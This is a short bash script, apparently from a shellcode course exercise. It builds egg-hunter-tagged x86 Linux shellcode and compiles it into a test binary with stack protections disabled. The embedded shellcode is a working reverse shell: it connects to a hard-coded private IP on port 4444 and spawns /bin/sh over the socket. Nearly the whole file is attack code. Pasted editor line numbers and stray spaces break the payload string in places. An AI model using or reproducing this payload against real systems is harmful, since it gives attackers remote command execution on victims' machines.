#!/bin/bash
 17
 16 if [ -z "$1" ]
 15   then
 14     echo "Usage $0 <EGG>"
 13     exit 1
 12 fi
 11
 10 EGG=`printf $1 | od -An -t x1 | sed 's/ /\\\\x/g'`
  9 echo "EGG:"$EGG
  8
  7 shellcode="$EGG$EGG\x31\xc0\x31\xdb\x31\xc9\xb3\x01\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc6\x5b\x31\xd2\x68\xc0\xa8\x76\x81\x66\x    68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x56\x43\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\x89\xf3\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x51\x6    8\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xca\xb0\x0b\xcd\x80"
  6 echo "Shellcode:"
  5 echo $shellcode
  4
  3
  2 cat shellcode_nova.c | sed "s/EGG/`printf $1 | od -An -t x1 | sed 's/ /\\\\\\\\x/g'`/g" > shellcode_new.c
  1 gcc -w -fno-stack-protector -z execstack shellcode_new.c -o shellcode_new
